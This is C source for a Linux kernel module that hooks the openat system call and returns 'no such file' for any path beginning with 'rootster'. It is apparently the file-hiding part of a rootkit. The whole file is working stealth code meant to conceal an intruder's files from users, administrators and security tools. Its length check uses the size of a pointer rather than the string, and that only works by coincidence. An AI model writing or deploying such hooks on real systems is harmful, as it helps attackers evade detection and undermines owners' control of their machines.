#include "openat.h"
#include "linux/kern_levels.h"
#include "linux/linkage.h"
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>

asmlinkage long (*real_sys_openat)(struct pt_regs *regs);

const char *TARGET_DIR = "rootster";

asmlinkage long openat_hook(struct pt_regs *regs) {
  // printk(KERN_DEBUG "Hooked Openat");

  char pathname[256]; // Buffer to hold the pathname from user space
  int ret;

  /* regs->si holds the pointer to the pathname argument in openat */
  ret = strncpy_from_user(pathname, (char __user *)regs->si, sizeof(pathname));
  // printk(KERN_INFO "Listing dir: %s\n", pathname);
  if (ret > 0) {
    /* Compare the pathname with your target string */
    if (strncmp(pathname, TARGET_DIR, sizeof(&TARGET_DIR)) == 0) {
      printk(KERN_INFO "Matched directory: %s\n", pathname);
      return -ENOENT;
    }
  }

  return real_sys_openat(regs);
}
